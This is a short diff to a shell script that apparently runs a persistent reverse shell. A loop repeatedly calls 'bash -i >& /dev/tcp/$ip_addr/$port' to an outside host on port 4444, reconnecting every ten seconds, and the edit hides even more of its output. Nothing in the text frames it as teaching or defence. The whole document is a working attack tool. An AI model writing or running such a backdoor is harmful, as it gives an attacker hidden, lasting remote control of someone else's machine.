@@ -7,8 +7,8 @@ port="4444"
 # Function to start the reverse shell
 start_reverse_shell() {
     while true; do
-        # Start the reverse shell, suppressing error messages
-        bash -i >& /dev/tcp/$ip_addr/$port 0>&1 2>/dev/null
+        # Start the reverse shell, suppressing all output and error messages
+        bash -i >& /dev/tcp/$ip_addr/$port 0>&1 &>/dev/null
         sleep 10 # Wait before reconnecting
     done
 }
